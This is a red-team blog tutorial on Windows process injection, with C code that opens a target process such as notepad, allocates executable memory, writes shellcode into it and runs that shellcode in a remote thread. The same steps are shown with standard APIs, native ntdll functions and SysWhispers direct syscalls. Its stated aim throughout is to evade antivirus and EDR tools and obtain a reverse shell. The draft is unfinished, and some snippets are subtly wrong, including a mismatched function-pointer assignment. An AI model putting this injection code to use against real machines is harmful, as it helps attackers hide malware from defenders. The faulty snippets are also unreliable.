---
layout: default
---

# Process Injection: Remote Thread Injection or CreateRemoteThread

In Every Red Team Operation, the goal of the Team is to Stay Stealthy and hide campaign operation from the blue team. From getting the initial access to hiding the C2 connections and extra filtering data, they use various techniques and procedures to do that. The first step of every campaign is to get initial access. They use customized malware and payloads to circumvent and evade defending tools such as AVs and EDRs. 

[Process Injection](https://attack.mitre.org/techniques/T1055/) is one of the techniques that is used to evade the defense mechanism. Remote Thread Injection (aka CreateRemoteThread) is one of the simple and reliable sub technique. it works by injecting the shellcode (payload) into the context of another eligible process and creates a thread for that process to run the payload.

<!-- ![remote thread injection](/assets/images/remote-thread-injection.png "remote thread injection") -->
```
                                                                                                   
          +-------------------+                                          +-------------------+     
          |                   |                                          |                   |     
          |                   |                                          |                   |     
          |  Notepad Process  |                                          |  Malware Process  |     
          |                   |                                          |                   |     
          |                   |           1 allocating space             |                   |     
          |-------------------| <--------------------------------------  |                   |     
          |     shellcode     |                                          |                   |     
          |                   |           2 writing shellcode            |                   |     
          +-------------------+ <--------------------------------------  +-------------------+     
                 ^                                                         |                       
                 |                                                         |                       
                 |                                                         |                       
                 |                                                         |                       
                 v             3 creating a remote thread to run shellcode |                       
             +---------+                                                   |                       
             |         |  <------------------------------------------------+                       
             | thread  |                                                                           
             |         |                                                                           
             +---------+                                                                           
                                                                                                   
```
We implement remote thread injection using standard Windows APIs, native APIs, and direct syscalls. each of these implementations has its own pros and cons. 
the following picture shows how standard windows APIs, Native APIs and direct syscalls work in windows architecture.

<!-- ![windows api call architecture](/assets/images/windows-api-calls.png "windows api call architecture") -->
```
                                  +------------------------------+                                  
                                  |                              |                                  
                      +-----------|     Application Process      |----------------+                 
                      |           |                              |                |                 
                      |           +------------------------------+                |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           | Standarad Windows API         |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           v                               |                 
                      |           +------------------------------+                |                 
                      |           |                              |                |                 
       Native API     |           |          kernel32.dll        |                |                 
                      |           |                              |                |                 
                      |           +------------------------------+                |  Direct Syscalls
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           v                               |                 
                      |           +------------------------------+                |                 
                      |           |                              |                |                 
                      +---------> |           Ntdll.dll          |                |                 
                                  |                              |                |                 
 User-Mode                        +------------------------------+                |                 
                                                  |                               |                 
                                                  |                               |                 
 -------------------------------------------------|-------------------------------|-----------------
                                                  |                               |                 
                                                  |                               |                 
 Kernel-Mode                                      |                               |                 
                                  +---------------v--------------+                |                 
                                  |                              |                |                 
                                  |         ntoskrnl.exe         | <--------------+                 
                                  |                              |                                  
                                  +------------------------------+                                  
```
<!-- all of these procedures consists of these steps:
1. Find Your target process
2. Allocate a memory space into that process
3. Write Your Shellcode into that space
4. Create a Thread to Run Your shellcode -->
now let's code.
## Standard Windows APIs
### pros:
- easy to use

### cons:
- detectable by most AV/EDRs

we start by using standard Windows APIs as it is simpler than two other ways.
First We Need to find our target Process ID. We create a function called ```find_process``` that gets a process name as input and returns the process id. this section of code is common between all of the implementations. 
<!-- ### Find Target Process ID -->
It uses **CreateToolhelp32Snapshot** API to get the list of processes and uses **Process32First** and **Process32Next** to go through them one by and check to compare the name of the processes with our target process. all of these APIs get **PROCESSENTRY32**. If it succeeds to find the process it returns its process ID.
```c
DWORD find_process(char *process_name){

	PROCESSENTRY32 process_entry;
	process_entry.dwSize = sizeof(PROCESSENTRY32);

	//get the list of processes
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	//check processes to find TARGET_PROCESS_NAME
	if (Process32First(snapshot, &process_entry) == TRUE){
		
        	while (Process32Next(snapshot, &process_entry) == TRUE){
        		if (stricmp(process_entry.szExeFile, process_name) == 0){  
				    CloseHandle(snapshot);
				    return process_entry.th32ProcessID;
            	}
        	}
    	}

	CloseHandle(snapshot);
	return 0;
}
```
for the Next Step, we need to open our target process using [OpenProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) function. We pass our parameters including the target process id that we get from the previous step and it returns a handle to that process.
```c
target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_process_id);
```
 now we need to allocate a space for our shell code in target process using [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) function. we should allocate this space with **PAGE_EXECUTE_READWRITE** (Read, Write, Execute) permission. this function returns the base address of the allocated region. 
 ```c
 remote_process_buffer = VirtualAllocEx(target_process_handle, NULL, sizeof(buf), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```
now we should write our shell code into our allocated memory region using [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) function. 
```c
WriteProcessMemory(target_process_handle, remote_process_buffer, buf, sizeof(buf), NULL);
```
after all it's time to create a thread in target process and run the shell code that we previously write into a memory page. we use [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) function. we should also pass 0 to **dwCreationFlags** paremter to run the thread imedietly after creation. 
```c
CreateRemoteThread(target_process_handle, NULL, 0,(LPTHREAD_START_ROUTINE) remote_process_buffer,NULL,0, NULL);
```
that's it for this part. now we need to compile our code. in order to compile it in kali we use **MinGW**.
```bash
x86_64-w64-mingw32-gcc main.c -o rti.exe
```
we send the output to our windows machine and run it. if we open **process hacker** and take a look at **notepad.exe** process. in memory section there is only one memory page with RWX permission which is a little suspisous. if we open it we can see our shell code inside it. 
[picture]
i should mention that sysmon get's the event of thread creation and ... and all other EDRs [write more]

that's it for this part. 

## Native API
#### pros:
- bypass some of the AV/EDRs

#### cons:
- hard to use
- still detectable by most AV/EDRs
- may not work on all windows versions

Native APIs or Undocumented APIs are kind of wrapers on Standardad API. the standard api actually are working on these apis on a higher level. microsoft doesn't recommend using these APIs. if you look at the following picture you can see how these APIs are working. 
in order to interact with operating system programmers use standard APIs (win 32 apis) that are recommended by microsoft. at bottem of these apis there are native apis that you can find them in NTDLL.dll. native api also interact with os kernel using syscalls. 
microsoft uses this archtecht to change the os without affecting the standard APIs. 
in the previous level we used standard APIs to do our job. here we go one layer deeper and use native APIs. 
Native APIs are called undocumented APIs because mostly you can't find a formal documentation to use them. we can find the way of using them mosty by seeing other people efforts and researching around them to see how they work. most of these APIs names start with Nt or Zw. 
Let's go to do our jobs and go through the steps.

here we have a couple of more steps to use NTAPIS first we should load ntdll.dll which contains these APIS then we should define function pointers and get the base address of these function to these pointers.

for loading ntdll.dll or anyother dll dynamicly into our running process we use [LoadLibraryW](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw) function and it returns a handle to that library. 
```c
HMODULE hNtdll = LoadLibraryW(L"ntdll");
```
then we define a fucntion pointer and get the base address of function using **GetProcAddress** function and assign it to the pointer. here is the example for **NtOpenProcess**. 
```c
typedef NTSTATUS(NTAPI* pNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
```
you should do this for all **NtWriteVirtualMemory**, **NtAllocateVirtualMemory**, **NtCreateThreadEx** functions. and take care that the pointer you define should exacly be like the original function. we should define a prototype of functions and we should define all the parameters for it. for finding the parameter and structure of an undocumented api you can use [http://undocumented.ntinternals.net/](http://undocumented.ntinternals.net/). but you may not find all the things in it. you can search for it and see other examples or even reverse ntdll.dll file to see how it exactly works. 


### 1- opening target process (NtOpenProcess)
like the previous section we start by opening our target process but this time using [NtOpenProcess](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess). this function does not return a Handle to our target process but we need to pass a handle pointer as argument(pass by refrence).
we should also pass a pointer to an [OBJECT_ATTRIBUTES](https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes) structure and a pointer to a **Client ID** so let's define them. we should also initilize **OBJECT_ATTRIBUTES**  using [InitializeObjectAttributes](https://docs.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes) macro and define **UNICODE_STRING** struct.
```c
#define InitializeObjectAttributes(p,n,a,r,s) { \
(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
(p)->RootDirectory = (r); \
(p)->Attributes = (a); \
(p)->ObjectName = (n); \
(p)->SecurityDescriptor = (s); \
(p)->SecurityQualityOfService = NULL; \
}

typedef struct _CLIENT_ID
{
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES ;
```
now we can use **NtOpenProcess**
```c
NtOpenProcess(&target_process_handle,PROCESS_ALL_ACCESS, &oa, &ci);
```
### 2- Allocating space in target process memory space
for this step we use [NtAllocateVirtualMemory](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory) function. we define the function prototype. 
```c
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
```
then we get the base address of the function 
```c
pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
```
and we call it
```c
NtAllocateVirtualMemory(target_process_handle, &remote_process_buffer, 0,&buf_len ,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```
we pass a void pointer named **remote_process_buffer** that will be the base address of our allocated space.
### 3- writing shell code in target process
we define [NtWriteVirtualMemory](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html) function prototype like previous steps. then call it. 
```c
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten OPTIONAL);
pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
NtWriteVirtualMemory(target_process_handle, remote_process_buffer, buf, buf_len, NULL);
```
we should pass our shellcode and lenght of the shellcode and the base address of our allocated space as arguments. 
### 4- creating remote thread and runing the shellcode
now it's time to create a thread in our target process and run our shellcode. we use **NtCreateThreadEx** to create a remote thread in target process and run our shellcode. we should also pass 0 as the 7th argument to run the thread imideatly after creation. to see the function prototype you can look [here](https://github.com/processhacker/processhacker/blob/753a395d55634f5e5483c517219414c2ecacfc23/phnt/include/ntpsapi.h#L1814). also the desired access as i mention.
```c
NtCreateThreadEx(&thread_handle, 0x1FFFFF, NULL, target_process_handle,(LPTHREAD_START_ROUTINE)remote_process_buffer,NULL, FALSE, NULL, NULL, NULL, NULL);
```
and now we have our reverse shell. 

let's go a little deeper and and implement it using syscalls

## Direct Syscalls
#### pros:
- undetectable by all of the API monitoring tools that work on user-space

#### cons:
- may not work on all windows versions
- hard to use

in the previous steps any API monitoring application and EDRs could detect our API calls and detect our operation. now if we use direct syscalls nothing in user land can detect our api calls. but as [sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) stays as a driver in kernel space we can't do anything with it and it create events for ....

one of the cons of using syscalls is that they are version specific. and they may not work on different windows versions. but with using [SysWhisper](https://github.com/jthuraisamy/SysWhispers) we can generate syscalls for different windows versions. i run the following command to generate syscalls for my desired functions for windows 10.
```bash
syswhispers.py --function NtCreateProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscall --versions 10
```
this command makes two output file **syscall.asm** and **syscall.h** that i shuold add to my visual studio project. then i should enable [MASM](https://docs.microsoft.com/en-us/cpp/assembler/masm/masm-for-x64-ml64-exe?view=msvc-160) in my project. 

after that using the functions such as native apis but here we don't need to load **ntdll.dll** and get base address of function and definging prototypes. and i think using SysWhisper has made really easy to use syscalls. 

you can see the code for these sections in [here](https://github.com/AlionGreen/remote-thread-injection).

## References:
[https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)

[https://www.ired.team/offensive-security/code-injection-process-injection/process-injection/](https://www.ired.team/offensive-security/code-injection-process-injection/process-injection/)

[https://blog.dylan.codes/defending-your-malware/](https://blog.dylan.codes/defending-your-malware/)

